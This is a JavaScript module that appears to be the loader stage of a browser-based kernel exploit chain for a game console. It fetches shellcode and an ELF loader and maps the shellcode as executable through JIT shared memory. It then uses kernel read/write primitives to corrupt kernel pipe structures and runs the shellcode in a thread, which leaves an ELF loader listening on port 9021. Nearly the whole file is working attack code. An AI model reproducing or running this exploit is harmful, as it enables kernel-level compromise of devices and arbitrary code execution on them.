import { int64 } from "./utils/int64.js";
import { DEFAULT_BINARIES } from "./binaries.js";

const O_NONBLOCK = 0x4;
const PROT_RW = 0x3, PROT_RWX = 0x7;
const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;

// The bundled paths live in ./binaries.js, which is the only place they are
// written down. Re-exported here because this module is what payloads import.
export { DEFAULT_BINARIES as DEFAULT_CONFIG };

export function getBinaryConfig() {
  const cfg = (typeof window !== "undefined" && window.LOADER_CONFIG) || {};
  return {
    kexpPath: cfg.KEXP_BIN || DEFAULT_BINARIES.KEXP_BIN,
    elfldrPath: cfg.ELFLDR_ELF || DEFAULT_BINARIES.ELFLDR_ELF,
  };
}

const PIPE = { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, defaultSize: 0x4000 };
const FD_ENTRY = { ofiles: 0x08, stride: 0x30, data: 0x00 };

function readU32(bytes, offset) {
  return (bytes[offset] | (bytes[offset + 1] << 8) |
    (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
}

function hex(value) {
  return "0x" + (value instanceof int64 ? value.toString(16) : (Number(value) >>> 0).toString(16));
}

function resolveSymbols(p) {
  const tables = (typeof window !== "undefined" && window.SYMBOLS) || {};
  const bases = { libkernel: p.libKernelBase, libc: p.libSceLibcInternalBase };
  const resolved = {};

  const required = {
    libkernel: ["getpid", "sysctlbyname", "sceKernelSendNotificationRequest", "pthread_create", "pthread_join"],
    libc: ["malloc", "free", "memcpy", "memset", "strcmp", "memcmp", "vsnprintf"],
  };

  for (const [group, names] of Object.entries(required)) {
    const base = bases[group];
    const offsets = tables[group];
    if (!base || (base.low === 0 && base.hi === 0))
      throw new Error(`kexp: ${group} base is unresolved`);
    if (!offsets)
      throw new Error(`kexp: ${group} symbols are missing`);

    const missing = names.filter((name) => typeof offsets[name] !== "number");
    if (missing.length)
      throw new Error(`kexp: ${group} is missing symbols: ${missing.join(", ")}`);
    resolved[group] = { base, offsets };
  }
  return resolved;
}

// Prefetch helpers share the payload log sink; reset it after each prefetch.
let prefetchLog = null;

export function setPrefetchLog(fn) {
  prefetchLog = typeof fn === "function" ? fn : null;
}

async function fetchBinary(path) {
  const url = new URL(path, document.baseURI).href;
  const response = await fetch(url);
  if (!response.ok) throw new Error(`kexp: fetch ${path} returned HTTP ${response.status}`);
  return new Uint8Array(await response.arrayBuffer());
}

// Fetch and validate both binaries before kernel work. runKexp consumes these bytes.
export async function prefetchBinaries({ kexpPath, elfldrPath } = {}) {
  const cfg = getBinaryConfig();
  const kexp = kexpPath || cfg.kexpPath;
  const elfldr = elfldrPath || cfg.elfldrPath;

  const say = (m) => { if (prefetchLog) prefetchLog(`kexp: ${m}`); };

  say(`prefetching ${elfldr}`);
  const elf = await fetchBinary(elfldr);
  if (elf.length < 0x1000 || readU32(elf, 0) !== 0x464c457f)
    throw new Error(`kexp: ${elfldr} is not an ELF binary (${elf.length} bytes)`);
  say(`prefetched ${elfldr}: ${elf.length} bytes`);

  say(`prefetching ${kexp}`);
  const blob = await fetchBinary(kexp);
  if (blob.length < 0x400)
    throw new Error(`kexp: ${kexp} is too small to be the shellcode (${blob.length} bytes)`);
  say(`prefetched ${kexp}: ${blob.length} bytes`);

  return { kexpBytes: blob, elfldrBytes: elf, kexpPath: kexp, elfldrPath: elfldr };
}

async function mapElf(bytes, path, p, chain, say) {
  const elf = bytes;
  say(`${path} was prefetched before the exploit, ${elf.length} bytes`);
  if (elf.length < 0x1000 || readU32(elf, 0) !== 0x464c457f)
    throw new Error(`kexp: ${path} is not an ELF binary`);

  const size = (elf.length + 0x3fff) & ~0x3fff;
  const base = await chain.syscall(SYS_MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
  if (base.low >>> 0 === 0xffffffff || base.low < 0x10000)
    throw new Error(`kexp: ${path} mmap failed`);
  say(`${path} mapped at ${hex(base)} (${hex(size)} bytes)`);

  const dwords = elf.length & ~3;
  for (let offset = 0; offset < dwords; offset += 4)
    p.write4(base.add32(offset), readU32(elf, offset));
  for (let offset = dwords; offset < elf.length; offset++)
    p.write1(base.add32(offset), elf[offset]);
  if (p.read4(base) >>> 0 !== 0x464c457f)
    throw new Error(`kexp: ${path} copy verification failed`);
  say(`${path} copied and verified`);

  return { base, size: elf.length };
}

async function mapExecutable(blob, p, chain) {
  const length = (blob.length + 0x3fff) & ~0x3fff;
  const failed = (value) => value.low >>> 0 === 0xffffffff;
  const copyInto = (destination) => {
    const dwords = blob.length & ~3;
    for (let offset = 0; offset < dwords; offset += 4)
      p.write4(destination.add32(offset), readU32(blob, offset));
    for (let offset = dwords; offset < blob.length; offset++)
      p.write1(destination.add32(offset), blob[offset]);
    for (let offset = 0; offset < dwords; offset += 4)
      if (p.read4(destination.add32(offset)) >>> 0 !== readU32(blob, offset)) return false;
    return true;
  };

  const execFd = await chain.syscall(SYS_JITSHM_CREATE, 0, length, PROT_RWX);
  if (failed(execFd) || execFd.low >= 0x100000)
    throw new Error("kexp: jitshm_create failed (" + hex(execFd) + ")");

  const entry = await chain.syscall(SYS_MMAP, 0, length, PROT_RWX, MAP_SHARED, execFd, 0);
  if (failed(entry) || entry.low < 0x10000)
    throw new Error("kexp: executable mmap failed (" + hex(entry) + ")");

  if (!copyInto(entry)) {
    const writeFd = await chain.syscall(SYS_JITSHM_ALIAS, execFd, PROT_RW);
    if (failed(writeFd) || writeFd.low >= 0x100000)
      throw new Error("kexp: writable jitshm alias failed");

    const writable = await chain.syscall(SYS_MMAP, 0, length, PROT_RW, MAP_SHARED, writeFd, 0);
    if (failed(writable) || writable.low < 0x10000)
      throw new Error("kexp: writable mmap failed (" + hex(writable) + ")");
    if (!copyInto(writable) || p.read4(entry) >>> 0 !== readU32(blob, 0))
      throw new Error("kexp: shellcode copy failed");
    await chain.syscall(SYS_MUNMAP, writable, length);
  }
  return entry;
}

async function makePipePair(p, chain) {
  const fds = p.malloc(8, 1);
  const rv = (await chain.syscall(SYS_PIPE2, fds, O_NONBLOCK)).low | 0;
  if (rv < 0) throw new Error("kexp: pipe2 failed (" + rv + ")");

  const readFd = p.read4(fds) >>> 0;
  const writeFd = p.read4(fds.add32(4)) >>> 0;
  if (!readFd || !writeFd || readFd >= 0x100000 || writeFd >= 0x100000)
    throw new Error("kexp: invalid pipe fds " + readFd + "/" + writeFd);
  return { readFd, writeFd };
}

async function prepareShellcodePipes(krw, master, victim) {
  const table = await krw.read8(krw.procFdAddr);
  const pipeOf = async (fd) => {
    const file = await krw.read8(table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride));
    return krw.read8(file.add32(FD_ENTRY.data));
  };

  const masterPipe = await pipeOf(master.readFd);
  const victimPipe = await pipeOf(victim.readFd);
  await krw.write4(masterPipe.add32(PIPE.count), 0);
  await krw.write4(masterPipe.add32(PIPE.in), 0);
  await krw.write4(masterPipe.add32(PIPE.out), 0);
  await krw.write4(masterPipe.add32(PIPE.size), PIPE.defaultSize);
  await krw.write8(masterPipe.add32(PIPE.buffer), victimPipe);

  const readBack = await krw.read8(masterPipe.add32(PIPE.buffer));
  if (readBack.low !== victimPipe.low || readBack.hi !== victimPipe.hi)
    throw new Error("kexp: pipe bootstrap failed");
}

function buildApiTable(symbols, p) {
  const addrOf = (group, name) => {
    const { base, offsets } = symbols[group];
    return base.add32(offsets[name]);
  };

  const table = p.malloc(12 * 8);
  for (let i = 0; i < 12 * 8; i += 8) p.write8(table.add32(i), 0);

  p.write8(table.add32(0 * 8), addrOf("libkernel", "sceKernelSendNotificationRequest"));
  p.write8(table.add32(1 * 8), addrOf("libkernel", "sysctlbyname"));
  // [2] pthread_create (unused)
  // [3] pthread_join (unused)
  p.write8(table.add32(4 * 8), addrOf("libkernel", "getpid"));
  p.write8(table.add32(5 * 8), addrOf("libc", "malloc"));
  p.write8(table.add32(6 * 8), addrOf("libc", "free"));
  p.write8(table.add32(7 * 8), addrOf("libc", "memcpy"));
  p.write8(table.add32(8 * 8), addrOf("libc", "memset"));
  p.write8(table.add32(9 * 8), addrOf("libc", "strcmp"));
  p.write8(table.add32(10 * 8), addrOf("libc", "memcmp"));
  p.write8(table.add32(11 * 8), addrOf("libc", "vsnprintf"));

  return table;
}

async function spawnAndJoin(entry, args, symbols, p, chain) {
  const { base, offsets } = symbols.libkernel;
  const create = offsets.pthread_create_name_np === undefined
    ? offsets.pthread_create
    : offsets.pthread_create_name_np;
  const handle = p.malloc(8);
  const result = p.malloc(8);
  p.write8(handle, 0);
  p.write8(result, 0);

  const created = await chain.call(base.add32(create), handle, new int64(0, 0), entry, args, p.stringify("kexp"));
  if (created.low >>> 0 !== 0)
    throw new Error("kexp: pthread_create returned " + hex(created));

  const joined = await chain.call(base.add32(offsets.pthread_join), p.read8(handle), result);
  return { joinResult: joined.low >>> 0, shellcodeResult: p.read8(result) };
}

// runKexp — map elfldr and kexp shellcode, bootstrap pipes, and execute.
export async function runKexp(krw, p, chain, log, options = {}) {
  const say = typeof log === "function" ? log : () => {};
  const cfg = getBinaryConfig();
  const kexpPath = options.kexpPath || cfg.kexpPath;
  const elfldrPath = options.elfldrPath || cfg.elfldrPath;
  const stopAfter = options.stopAfter || "spawn";
  const at = (stage) => stopAfter === stage;

  say(`using kexp binary: ${kexpPath}`);
  say(`using elfldr binary: ${elfldrPath}`);

  let allproc = options.allproc;
  if (!allproc) {
    const allprocRva = typeof window !== "undefined" && window.KRW && window.KRW.allproc;
    if (typeof allprocRva !== "number")
      throw new Error("kexp: allproc is missing for this firmware");
    if (!krw || !krw.ktextBase)
      throw new Error("kexp: kernel R/W handle missing ktextBase");
    allproc = krw.ktextBase.add32(allprocRva);
  }

  if ((allproc.hi & 0xffff0000) >>> 0 !== 0xffff0000)
    throw new Error("kexp: invalid allproc address " + hex(allproc));
  say(`allproc at ${hex(allproc)}`);

  const symbols = resolveSymbols(p);
  say("libkernel and libc symbols resolved");

  // Stage 1: map the prefetched ELF loader and shellcode.
  const elfldr = await mapElf(options.elfldrBytes, elfldrPath, p, chain, say);
  const blob = options.kexpBytes;
  if (!(blob instanceof Uint8Array))
    throw new Error("kexp: no shellcode bytes; call prefetchBinaries() before runKexp()");
  say(`kexp binary was prefetched before the exploit, ${blob.length} bytes`);

  const entry = await mapExecutable(blob, p, chain);
  say(`shellcode executable at ${hex(entry)}`);
  if (at("map")) {
    say("STOPPED after stage 1 (map): nothing executed");
    return { stage: "map" };
  }

  // --- stage 2: pipe bootstrap ---
  const master = await makePipePair(p, chain);
  say(`master pipe ${master.readFd}/${master.writeFd}`);
  const victim = await makePipePair(p, chain);
  say(`victim pipe ${victim.readFd}/${victim.writeFd}`);
  await prepareShellcodePipes(krw, master, victim);
  say("pipe bootstrap done -- master now points at victim");
  if (at("pipes")) {
    say("STOPPED after stage 2 (pipes): nothing executed");
    return { stage: "pipes" };
  }

  // --- stage 3: execute ---
  const apiTable = buildApiTable(symbols, p);

  // v2 argument structure (0x38 bytes)
  const args = p.malloc(0x38);
  for (let offset = 0; offset < 0x38; offset += 8) p.write8(args.add32(offset), 0);
  p.write4(args.add32(0x00), master.readFd);
  p.write4(args.add32(0x04), master.writeFd);
  p.write4(args.add32(0x08), victim.readFd);
  p.write4(args.add32(0x0c), victim.writeFd);
  p.write8(args.add32(0x10), allproc);
  p.write8(args.add32(0x18), elfldr.base);
  p.write8(args.add32(0x20), elfldr.size);
  p.write4(args.add32(0x28), 0x4B585032); // KEXP_API_MAGIC ('KXP2')
  p.write4(args.add32(0x2c), 12);         // KEXP_API_COUNT
  p.write8(args.add32(0x30), apiTable);   // api_entries table pointer

  say("calling pthread_create -- kexp shellcode runs from here");
  const result = await spawnAndJoin(entry, args, symbols, p, chain);
  if (result.joinResult !== 0)
    throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
  say("kexp shellcode returned " + hex(result.shellcodeResult));
  say("elfldr should now be listening on port 9021", "success");
  return { stage: "spawn", result: result.shellcodeResult };
}
